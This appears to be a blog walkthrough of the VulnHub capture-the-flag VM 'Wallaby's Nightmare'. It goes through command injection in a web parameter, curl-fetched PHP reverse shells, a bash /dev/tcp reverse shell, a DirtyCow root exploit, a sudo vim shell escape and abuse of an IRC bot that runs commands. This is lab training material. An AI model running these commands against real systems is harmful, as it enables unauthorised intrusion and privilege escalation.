<i>Wallaby's: Nightmare VM can be downloaded <a href="https://www.vulnhub.com/entry/wallabys-nightmare-102,176/" target="_blank">here</a>. </i><br /><br />First we'll start by scanning the victim's machine, <b>netdiscover </b>wasn't able to find the VM's IP so I did a quick subnet scan with nmap.<i> </i><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> nmap -F 192.168.1.0/24<br /><span style="color: #888888;">...</span><br /><span style="color: #888888;">Nmap scan report for 192.168.1.68</span><br /><span style="color: #888888;">Host is up (0.000094s latency).</span><br /><span style="color: #888888;">Not shown: 98 closed ports</span><br /><span style="color: #888888;">PORT   STATE SERVICE</span><br /><span style="color: #888888;">22/tcp open  ssh</span><br /><span style="color: #888888;">80/tcp open  http</span><br /><span style="color: #888888;">MAC Address: 08:00:27:63:9C:F9 (Oracle VirtualBox virtual NIC)</span><br /><span style="color: #888888;">...</span><br /></pre></div><br />Full scan yields the same results, so let's jump right into the web server.<br /><h2>Wallaby's server </h2>I thought the form was vulnerable to some sort of code injection but it wasn't, yet it was vulnerable to XSS (try <b><i>&lt;script&gt;alert(1)&lt;/script&gt;</i></b>). The author is nice enough to give you some hints, this challenge requires you to do some basic fuzzing, which could mean a lot of frustration too. Tmux? Wtf is <a href="https://en.wikipedia.org/wiki/Tmux">that</a>? Also not sure yet about the last point, but we should keep it in mind once we get a local shell.<br /><br />Wallaby seems to be very determined, he even made a page to mock you.<br /><br /><table style="border: 1px solid black;"><tbody><tr><td><div style="text-align: center;">What the heck is this?  Some guy named <i>abatchy </i> is trying to penetrate my server?  Loser must not know I'm the great Wallaby!</div><br /><div style="text-align: center;">Let's <b><i>observe</i></b> him for now, maybe I could learn about him from his behavior. <br /><img src="http://i.imgur.com/enwMemI.jpg" /></div></td></tr></tbody></table><br />The url format might be vulnerable to LFI (<i>http://192.168.1.68/?<b>page=home</b>). http://192.168.1.68/?page=<b>/etc/passwd </b></i>shows /etc/passwd file, or that's what you think! <br /><br />Try any other file and you'll get various custom error messages, which made me believe the <b>/etc/passwd</b> file we see is fake, if the <b>/etc/passwd</b> string exists for the page parameter it's returned.<br /><br />After poking around a little I got the following message!<br /><br /><table style="border: 1px solid black;"><tbody><tr><td><h4>That's some fishy stuff you're trying there <i>abatchy </i>buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...</h4>(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)</td></tr></tbody></table><br />Afterwards the website wouldn't load any more, I thought I broke the server accidentally by running other tools against it and even reverted the machine, yet when it happened again I did another port scan on it.<br /><br />Guess what?<br /><br />Webserver is now running on port 60080, that must be Wallaby's homemade IDS...<br /><br /><table style="border: 1px solid black;"><tbody><tr><td><div style="text-align: center;">HOLY MOLY, this guy <i>abatchy </i>wants me...Glad I moved to a different port so I could work more securely!!!</div><br /><div style="text-align: center;">As we all know, <b><i>security by obscurity</i></b> is the way to go...<br /><img src="http://i.imgur.com/Fcuw0Sx.png" /></div></td></tr></tbody></table><br />The image didn't contain any hidden messages/comments/files, so I continued doing more fuzzing on the possible LFI vulnerability discovered. <b>dirsearch </b>didn't work properly, so I had to go back to the old <b>dirbuster</b>.<br /><img src="http://i.imgur.com/ptbv4Sk.png" height="460" width="640" /><br />Although you'll notice that all urls found are index.php, check the size column, they're different! Definitely something worth checking. Luckily I ran dirbuster from the terminal so I could see that the hit urls are different than seen in the table, anyhow rightclick the row and check the response for each.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~/Desktop/dirsearch#</span> dirbuster<br /><span style="color: #888888;">Starting OWASP DirBuster 1.0-RC1</span><br /><span style="color: #888888;">Starting URL fuzz</span><br /><span style="color: #888888;">Starting fuzz on http://192.168.1.68:60080/index.php?page={dir}</span><br /><span style="color: #888888;">Dir found: /index.php?page=index - 200</span><br /><span style="color: #888888;">Dir found: /index.php?page=%27 - 200</span><br /><span style="color: #888888;">Dir found: /index.php?page=mailer - 200</span><br /><span style="color: #888888;">Dir found: /index.php?page=contact - 200</span><br /><span style="color: #888888;">Dir found: /index.php?page=home - 200</span><br /><span style="color: #888888;">Dir found: /index.php?page=blacklist - 200</span><br /><span style="color: #888888;">Dir found: /index.php?page=who%27s-connecting - 200</span><br /><span style="color: #888888;">DirBuster Stopped</span><br /></pre></div><br />You better go through them one by one. One of them is the key. Stop reading if you didn't figure it out yet.<br /><h2>Getting limited shell</h2>Did you figure it out?<br /><br /><b>index.php?page=mailer</b> is the one to check to the comments found in the source.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: green; font-weight: bold;">&lt;h2</span> <span style="color: #7d9029;">style=</span><span style="color: #ba2121;">'color:blue;'</span><span style="color: green; font-weight: bold;">&gt;</span>Coming Soon guys!<span style="color: green; font-weight: bold;">&lt;/h2&gt;</span><br />    <span style="color: #408080; font-style: italic;">&lt;!--a href='/?page=mailer&amp;mail=mail wallaby "message goes here"'&gt;&lt;button type='button'&gt;Sendmail&lt;/button--&gt;</span><br />    <span style="color: #408080; font-style: italic;">&lt;!--Better finish implementing this so abatchy</span><br /><span style="color: #408080; font-style: italic;"> can send me all his loser complaints!--&gt;</span><br /></pre></div>Is the mail functionality implemented? Probably not, but the way the second parameter is sent looks to be passed directly into some interpreter.<br /><ul><li><b>/index.php?page=mailer&amp;mail=whoami </b>returns "www-data"! Let's try to start a listener on our attacking machine and get a reverse shell!</li></ul><ul><li><b>index.php?page=mailer&amp;mail=nc -nv 192.168.1.67 -e /bin/bash </b>didn't work, Wallaby was again one step ahead of us.<br /><h4>"How you gonna use netcat so obviously.  Cmon man.  This is all in the logs." </h4></li></ul>After running a few commands I noticed that<b> netcat</b> exists under /bin/netcat but doesn't have the -e option available. That is not an issue thanks to <a href="https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem">this</a>. But I prefer using the php reverse shell script, which can be found <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a>.<br /><br />Save it as .txt so it doesn't get interpreted and store it on the victim's machine.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">http://192.168.1.68:60080/index.php?page=mailer&amp;mail=curl http://192.168.1.67/4444.txt &gt; shell.php; chmod 777 shell.php; ls -al<br /></pre></div><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">total 104<br />drwxr-xr-x 3 www-data www-data  4096 Jan  2 22:16 .<br />drwxr-xr-x 3 root     root      4096 Dec 16 21:31 ..<br />-rw-r--r-- 1 root     root     15953 Aug 11  2015 eye.jpg<br />-rw-r--r-- 1 root     root      3639 Dec 27 19:19 index.php<br />drwxr-xr-x 2 root     root      4096 Dec 27 12:25 s13!34g$3FVA5e@ed<br />-rw-r--r-- 1 root     root     57626 Dec 27 12:24 sec.png<br />-rwxrwxrwx 1 www-data www-data  5494 Jan  2 22:16 shell.php<br />-rw-r--r-- 1 www-data www-data     8 Jan  2 21:07 uname.txt<br /></pre></div><br />Hit /shell.php and you'll get your shell!<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:/var/www/html#</span> nc -nvlp 4444<br /><span style="color: #888888;">listening on [any] 4444 ...</span><br /><span style="color: #888888;">connect to [192.168.1.67] from (UNKNOWN) [192.168.1.68] 39308</span><br /><span style="color: #888888;">Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br /><span style="color: #888888;"> 22:20:52 up  1:22,  1 user,  load average: 0.00, 0.00, 0.00</span><br /><span style="color: #888888;">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br /><span style="color: #888888;">waldo    pts/0    tmux(722).%0     20:57    1:23m  0.39s  0.39s irssi</span><br /><span style="color: #888888;">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br /><span style="color: #888888;">/bin/sh: 0: can't access tty; job control turned off</span><br /><span style="color: navy; font-weight: bold;">$</span> python -c <span style="color: #ba2121;">'import pty; pty.spawn("/bin/bash")'</span><br /><span style="color: navy; font-weight: bold;">www-data@ubuntu:/$</span> <br /></pre></div><h2>Privilege escalation </h2>There are two different ways to get root, one through dirty cow, and another by escalating privileges to waldo then wallaby.<br /><br /><h4>Dirty cow</h4><a href="http://cowroot.c/">cowroot.c</a> worked fine. You can prevent kernel from crashing <a href="https://github.com/dirtycow/dirtycow.github.io/issues/25#issuecomment-255852675">too</a>. This is not the expected method to get root access though.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">www-data@ubuntu:/$</span> <span style="color: green;">cd</span> /tmp<br /><span style="color: #888888;">cd /tmp</span><br /><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> wget https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c<br /><span style="color: #888888;">&lt;fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c         </span><br /><span style="color: #888888;">...</span><br /><span style="color: #888888;">Length: 4688 (4.6K) [text/plain]</span><br /><span style="color: #888888;">Saving to: 'cowroot.c'</span><br /><br /><span style="color: #888888;">cowroot.c           100%[===================&gt;]   4.58K  --.-KB/s    in 0s      </span><br /><br /><span style="color: #888888;">2017-01-02 22:27:42 (9.57 MB/s) - 'cowroot.c' saved [4688/4688]</span><br /><br /><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> gcc cowroot.c -o cowroot -pthread<br /><span style="color: #888888;">...</span><br /><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> ./cowroot<br /><span style="color: #888888;">./cowroot</span><br /><span style="color: #888888;">DirtyCow root privilege escalation</span><br /><span style="color: #888888;">Backing up /usr/bin/passwd to /tmp/bak</span><br /><span style="color: #888888;">Size of binary: 54256</span><br /><span style="color: #888888;">Racing, this may take a while..</span><br /><span style="color: #888888;">thread stopped</span><br /><span style="color: #888888;">thread stopped</span><br /><span style="color: #888888;">/usr/bin/passwd overwritten</span><br /><span style="color: #888888;">Popping root shell.</span><br /><span style="color: #888888;">Don't forget to restore /tmp/bak</span><br /><span style="color: navy; font-weight: bold;">root@ubuntu:/tmp#</span>  <span style="color: green;">echo </span>0 &gt; /proc/sys/vm/dirty_writeback_centisecs<br /><span style="color: #888888;"> echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br /><span style="color: navy; font-weight: bold;">root@ubuntu:/tmp#</span> whoami<br /><span style="color: #888888;">whoami</span><br /><span style="color: #888888;">root</span><br /></pre></div><br /><h4></h4><h4>Privilege escalation to waldo</h4>One thing you should always do is running <b>sudo -l </b>when possible, this proved to be very useful.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> sudo -l<br /><span style="color: #888888;">sudo -l</span><br /><span style="color: #888888;">Matching Defaults entries for www-data on ubuntu:</span><br /><span style="color: #888888;">    env_reset, mail_badpass,</span><br /><span style="color: #888888;">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br /><br /><span style="color: #888888;">User www-data may run the following commands on ubuntu:</span><br /><span style="color: #888888;">    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br /><span style="color: #888888;">    (ALL) NOPASSWD: /sbin/iptables</span><br /></pre></div><br />Two different rules, does that mean two different ways to get higher privileges? Possibly.<br /><br />You might've noticed that port 6667 was marked as filtered in your nmap scan, guess you were right! Check the current iptables rules.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> sudo /sbin/iptables -L<br /><span style="color: #888888;">sudo /sbin/iptables -L</span><br /><span style="color: #888888;">Chain INPUT (policy ACCEPT)</span><br /><span style="color: #888888;">target     prot opt source               destination         </span><br /><span style="color: #888888;">ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd</span><br /><span style="color: #888888;">DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd</span><br /><br /><span style="color: #888888;">Chain FORWARD (policy ACCEPT)</span><br /><span style="color: #888888;">target     prot opt source               destination         </span><br /><br /><span style="color: #888888;">Chain OUTPUT (policy ACCEPT)</span><br /><span style="color: #888888;">target     prot opt source               destination  </span><br /></pre></div><br />Let's flush them so IRC is unblocked.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> sudo /sbin/iptables --flush<br /><span style="color: #888888;">sudo /sbin/iptables --flush</span><br /><span style="color: navy; font-weight: bold;">www-data@ubuntu:/tmp$</span> sudo /sbin/iptables -L<br /><span style="color: #888888;">sudo /sbin/iptables -L</span><br /><span style="color: #888888;">Chain INPUT (policy ACCEPT)</span><br /><span style="color: #888888;">target     prot opt source               destination         </span><br /><br /><span style="color: #888888;">Chain FORWARD (policy ACCEPT)</span><br /><span style="color: #888888;">target     prot opt source               destination         </span><br /><br /><span style="color: #888888;">Chain OUTPUT (policy ACCEPT)</span><br /><span style="color: #888888;">target     prot opt source               destination  </span><br /></pre></div><br />If you run nmap again you'll notice that port 6667 is no longer blocked, I used <b>hexchat </b>to connect to IRC.<br /><br />You'll notice that there are no channels to join, I kept going through the <b>/home</b> directory till I found <b>/home/wallaby/.sopel/logs/raw.log</b>, which mentions a channel called <b>#wallabyschat</b>!<br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">www-data@ubuntu:/home/wallaby/.sopel/logs$</span> cat raw.log | grep <span style="background-color: #fff0f0;">"#"</span><br /><span style="color: #c65d09; font-weight: bold;">&gt;</span>&gt;1481932041.885489 JOIN <span style="color: #888888;">#wallabyschat</span><br /></pre></div><br />After you join it <b>"/join #wallabyschat"</b> you'll see user waldo and wallabysbot.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/kAUCk1b.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/kAUCk1b.png" height="474" width="640" /></a></div><br />Neither waldo nor the bot will talk to you, so I went through the logs again and found that the bot responds to <b>.help</b> command.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #007700;">&lt;wallabysbot&gt;</span> You can see more info about any of these commands by doing .help <span style="color: #007700;">&lt;command&gt;</span> (e.g. .help time)<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span> ADMIN         set  quit  join  mode  msg  me  save  part<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span> ADMINCHANNEL  kickban  showmask  ban  topic  quiet  kick  tmask<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span>               unquiet  unban<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span> ANNOUNCE      announce<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span> CORETASKS     blocks  useserviceauth<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span> HELP          help<br /><span style="color: #007700;">&lt;wallabysbot&gt;</span> RUN           run<br /></pre></div><br />One interesting command is .run command only runs for waldo. After some digging I found that the script responsible for this is the run.py file under /home/wallaby/.sopel/modules. <br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #008800; font-weight: bold;">import</span> <span style="color: #0e84b5; font-weight: bold;">sopel.module</span><span style="color: #333333;">,</span> <span style="color: #0e84b5; font-weight: bold;">subprocess</span><span style="color: #333333;">,</span> <span style="color: #0e84b5; font-weight: bold;">os</span><br /><span style="color: #008800; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">sopel.module</span> <span style="color: #008800; font-weight: bold;">import</span> example<br /><br /><span style="color: #555555; font-weight: bold;">@sopel.module.commands</span>(<span style="background-color: #fff0f0;">'run'</span>)<br /><span style="color: #555555; font-weight: bold;">@example</span>(<span style="background-color: #fff0f0;">'.run ls'</span>)<br /><span style="color: #008800; font-weight: bold;">def</span> <span style="color: #0066bb; font-weight: bold;">run</span>(bot, trigger):<br />     <span style="color: #008800; font-weight: bold;">if</span> trigger<span style="color: #333333;">.</span>owner:<br />          os<span style="color: #333333;">.</span>system(<span style="background-color: #fff0f0;">'</span><span style="background-color: #eeeeee;">%s</span><span style="background-color: #fff0f0;">'</span> <span style="color: #333333;">%</span> trigger<span style="color: #333333;">.</span>group(<span style="color: #0000dd; font-weight: bold;">2</span>))<br />          runas1 <span style="color: #333333;">=</span> subprocess<span style="color: #333333;">.</span>Popen(<span style="background-color: #fff0f0;">'</span><span style="background-color: #eeeeee;">%s</span><span style="background-color: #fff0f0;">'</span> <span style="color: #333333;">%</span> trigger<span style="color: #333333;">.</span>group(<span style="color: #0000dd; font-weight: bold;">2</span>), stdout<span style="color: #333333;">=</span>subprocess<span style="color: #333333;">.</span>PIPE)<span style="color: #333333;">.</span>communicate()[<span style="color: #0000dd; font-weight: bold;">0</span>]<br />          runas <span style="color: #333333;">=</span> <span style="color: #007020;">str</span>(runas1)<br />          bot<span style="color: #333333;">.</span>say(<span style="background-color: #fff0f0;">' '</span><span style="color: #333333;">.</span>join(runas<span style="color: #333333;">.</span>split(<span style="background-color: #fff0f0;">'</span><span style="background-color: #fff0f0; color: #666666; font-weight: bold;">\\</span><span style="background-color: #fff0f0;">n'</span>)))<br />     <span style="color: #008800; font-weight: bold;">else</span>:<br />          bot<span style="color: #333333;">.</span>say(<span style="background-color: #fff0f0;">'Hold on, you aren</span><span style="background-color: #fff0f0; color: #666666; font-weight: bold;">\'</span><span style="background-color: #fff0f0;">t Waldo?'</span>)<br /></pre></div><br /><br />You need to kick out waldo so you can use its nick and let the bot run commands as wallaby. How do we do that? Remember the vim command in sudo -l?<br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">www-data@ubuntu:/$</span> sudo -l<br /><span style="color: #888888;">sudo -l</span><br /><span style="color: #888888;">Matching Defaults entries for www-data on ubuntu:</span><br /><span style="color: #888888;">    env_reset, mail_badpass,</span><br /><span style="color: #888888;">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br /><br /><span style="color: #888888;">User www-data may run the following commands on ubuntu:</span><br /><span style="color: #888888;">    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br /><span style="color: #888888;">    (ALL) NOPASSWD: /sbin/iptables</span><br /><span style="color: #c65d09; font-weight: bold;">www-data@ubuntu:/$</span> sudo -u waldo usr/bin/vim /etc/apache2/sites-available/000-default.conf<br /><span style="color: #888888;">fault.confldo usr/bin/vim /etc/apache2/sites-available/000-de </span><br /><br /><span style="color: red;"><i><span style="color: #888888;">TYPE :!bash</span></i></span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">&nbsp;</span><br /><span style="color: #c65d09; font-weight: bold;">waldo@ubuntu:/$</span> whoami<br /><span style="color: #888888;">whoami</span><br /><span style="color: #888888;">waldo</span><br /></pre></div><br />We got a shell for waldo!  You can now attach the tmux terminal and use waldo's session. Now, either log out waldo OR use the CLI based IRC client running to run commands as him. I chose the first since I'd rather use a GUI.<br /><br /><h4>On waldo's shell</h4>1. "tmux attach"<br />2. /exit<br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">* waldo has quit (Quit: leaving)</span><br /></pre></div><br />On hexchat:<br /><ol></ol>1. /nick waldo<br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">* You are now known as waldo</span><br /></pre></div><br />2. Go to wallabysbot window and chat with the bot, you can now run ".run whoami"<br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">&lt;waldo&gt; .run whoami<br />&lt;wallabysbot&gt; b'wallaby </span><br /></pre></div><br />Now you can run code as wallaby!<br /><br />The .run command felt very tricky to me, initially I created a revsh payload through msfvenom, uploaded it and ran it using the full path. I discovered later an easier approach, discussed below.<br /><br />Let's get a shell by starting a listener on 8080 on our attacking machine, then type the following:<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">.run bash -c "bash -i &gt;&amp; /dev/tcp/192.168.94.128/8080 0&gt;&amp;1"</span><br /></pre></div><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> nc -nvlp 8080<br /><span style="color: #888888;">listening on [any] 8080 ...</span><br /><span style="color: #888888;">connect to [192.168.94.128] from (UNKNOWN) [192.168.94.131] 48748</span><br /><span style="color: #888888;">bash: cannot set terminal process group (637): Inappropriate ioctl for device</span><br /><span style="color: #888888;">bash: no job control in this shell</span><br /><span style="color: #c65d09; font-weight: bold;">wallaby@ubuntu:~$</span> sudo -l<br /><span style="color: #888888;">sudo -l</span><br /><span style="color: #888888;">Matching Defaults entries for wallaby on ubuntu:</span><br /><span style="color: #888888;">    env_reset, mail_badpass,</span><br /><span style="color: #888888;">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br /><br /><span style="color: #888888;">User wallaby may run the following commands on ubuntu:</span><br /><span style="color: #888888;">    (ALL) NOPASSWD: ALL</span><br /><span style="color: #c65d09; font-weight: bold;">wallaby@ubuntu:~$</span> sudo su<br /><span style="color: #888888;">sudo su</span><br /><span style="color: #888888;">whoami</span><br /><span style="color: #888888;">root</span><br /><span style="color: #888888;">cd /root</span><br /><span style="color: #888888;">ls -al</span><br /><span style="color: #888888;">total 48</span><br /><span style="color: #888888;">drwx------  4 root root 4096 Dec 27 19:31 .</span><br /><span style="color: #888888;">drwxr-xr-x 22 root root 4096 Dec 14 19:24 ..</span><br /><span style="color: #888888;">drwxr-xr-x  2 root root 4096 Dec 27 11:27 backups</span><br /><span style="color: #888888;">-rw-------  1 root root    1 Dec 27 12:26 .bash_history</span><br /><span style="color: #888888;">-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc</span><br /><span style="color: #888888;">-rwxr-xr-x  1 root root  510 Dec 27 19:31 check_level.sh</span><br /><span style="color: #888888;">-rw-r--r--  1 root root  342 Dec 16 16:52 flag.txt</span><br /><span style="color: #888888;">-rw-------  1 root root   18 Dec 15 13:03 .mysql_history</span><br /><span style="color: #888888;">drwxr-xr-x  2 root root 4096 Dec 15 13:10 .nano</span><br /><span style="color: #888888;">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br /><span style="color: #888888;">-rw-r--r--  1 root root   66 Dec 15 17:50 .selected_editor</span><br /><span style="color: #888888;">-rw-r--r--  1 root root  214 Dec 16 17:09 .wget-hsts</span><br /><span style="color: #888888;">cat flag.txt</span><br /><span style="color: #c65d09; font-weight: bold;">#</span><span style="color: #888888;">##CONGRATULATIONS###</span><br /><br /><span style="color: #888888;">You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!</span><br /><br /><span style="color: #888888;">This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!</span><br /><br /><span style="color: #888888;">Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.</span><br /><br /><span style="color: #888888;">Thanks guys!</span><br /><span style="color: #888888;">-Waldo</span><br /></pre></div><br /><h2>Final notes</h2><ul><li>VM required a lot of fuzzing indeed, the mailer page was quite tricky and it was lucky for me to find it.</li><li>You can use both sudo NOPASSWD commands for getting a shell for waldo, either by getting a shell through vim or by using iptables to block waldo from connecting to IRC (thanks @audiblelink).</li><li>Even if you got root via dirtycow, make sure you try getting it through the intended path as well.</li><li><b>/index.php?page=blacklist</b> POST request is vulnerable to RCE via the <b>bl</b> parameter, I discovered this after finishing the VM. Just try passing <b>bl=; whoami ;.</b></li><li><b>.run </b>command is tricky due to the underlying python script, you can either use "bash -c command", write a script to execute<b> </b>or use an msfvenom payload.</li><li>Overall, very unique VM, the sopel bot was a pain in the ass till I figured out how it works.</li></ul>Thanks Waldo for the VM and waiting for part 2!<br /><br /><ul></ul>